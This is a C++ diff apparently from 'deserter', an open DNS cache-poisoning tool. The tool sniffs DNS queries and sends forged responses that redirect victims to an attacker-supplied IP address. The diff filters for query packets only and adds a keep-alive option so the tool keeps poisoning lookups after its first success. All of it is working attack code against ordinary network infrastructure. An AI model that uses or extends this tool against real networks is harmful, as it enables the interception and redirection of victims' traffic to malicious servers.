@@ -47,7 +47,7 @@ void Program::OnPacketCapture(pcpp::RawPacket* packet, pcpp::PcapLiveDevice* dev
     pcpp::Packet parsedPacket(packet);
 
     pcpp::DnsLayer* dnsLayer = parsedPacket.getLayerOfType<pcpp::DnsLayer>();
-    if(!dnsLayer) // the packet isn't a DNS one or isn't a type A record (temporary fix until support for more record types)
+    if(!dnsLayer || dnsLayer->getDnsHeader()->numberOfAnswers != 0 || dnsLayer->getDnsHeader()->numberOfAuthority != 0 || dnsLayer->getDnsHeader()->numberOfAdditional != 0) // the packet isn't a DNS one or is a retransmission / response packet)
         return;
     pcpp::EthLayer* ethLayer = parsedPacket.getLayerOfType<pcpp::EthLayer>();
     pcpp::UdpLayer* udpLayer = parsedPacket.getLayerOfType<pcpp::UdpLayer>(); 
@@ -71,7 +71,6 @@ void Program::OnPacketCapture(pcpp::RawPacket* packet, pcpp::PcapLiveDevice* dev
     pcpp::DnsLayer poisonedDnsLayer;
     poisonedDnsLayer.getDnsHeader()->transactionID = originalID;
     poisonedDnsLayer.getDnsHeader()->queryOrResponse = 1;
-
 
 #ifdef SUPPORT_MULTIPLE_QUERIES_IN_A_SINGLE_REQUEST
     for(pcpp::DnsQuery* currentQuery = dnsLayer->getFirstQuery(); currentQuery; currentQuery = dnsLayer->getNextQuery(currentQuery))
@@ -162,8 +161,11 @@ void Program::OnPacketCapture(pcpp::RawPacket* packet, pcpp::PcapLiveDevice* dev
         std::cerr << "Failed to send poisoned packet." << std::endl;
         Screen::Reset();
 
-        isCapturing = false;
-        capturingEnded.notify_all();
+        if(!args.keepAlive)
+        {
+            isCapturing = false;
+            capturingEnded.notify_all();
+        }
         return;
 
     }
@@ -172,8 +174,12 @@ void Program::OnPacketCapture(pcpp::RawPacket* packet, pcpp::PcapLiveDevice* dev
     std::cout << "Poisoned response sent." << std::endl;
     Screen::Reset();
 
-    isCapturing = false;
-    capturingEnded.notify_all();
+    if (!args.keepAlive)
+    {
+        isCapturing = false;
+        capturingEnded.notify_all();
+    }
+
     return;
 }
 
@@ -196,6 +202,7 @@ void Program::ParseArguments(int argc, char* argv[])
     parser.add_argument("-b", "--bad_ip").required().help("IP Address to inject into the cache. This shold be the address of the server you want to redirect the victim to");
     parser.add_argument("--ttl").default_value<uint32_t>(300).help("The time-to-live of the poisoned DNS record (specified in seconds). Defaults to 300s or 5min.").scan<'u', uint32_t>();
     parser.add_argument("-d", "--domains").help("Specific domains to poison - enter them in a comma-separated list without spaces");
+    parser.add_argument("-k", "--keep-alive").default_value(false).implicit_value(true).help("Used to tell deserter that it should keep waiting for more probes even after a successful poisoning.");
 
     std::vector<std::string> errors;
     try
@@ -240,6 +247,8 @@ void Program::ParseArguments(int argc, char* argv[])
             }
         }
 
+        args.keepAlive = parser.get<bool>("--keep-alive");
+        
         if(errors.size() != 0)
         {
             std::string error_message = "";
